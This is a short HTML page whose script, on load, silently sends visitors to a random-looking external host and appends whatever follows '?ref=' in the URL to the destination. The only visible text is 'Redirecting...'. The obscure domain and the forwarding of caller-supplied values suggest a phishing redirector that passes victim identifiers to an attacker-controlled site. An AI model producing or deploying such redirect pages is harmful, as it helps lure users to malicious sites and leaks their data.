<!DOCTYPE html>
<html>
<head>
  <script>
    window.onload = function () {
      const urlParams = new URLSearchParams(window.location.search);
      const refParam = urlParams.get('ref');

      if (refParam !== null) {
        const fullQuery = window.location.search;
        const refIndex = fullQuery.indexOf('?ref=');
        if (refIndex !== -1) {
          const afterRef = fullQuery.substring(refIndex + 5); // only skip "?ref=" (5 chars)
          const targetUrl = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/*' + afterRef;
          window.location.href = targetUrl;
        }
      } else {
        window.location.href = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/';
      }
    };
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
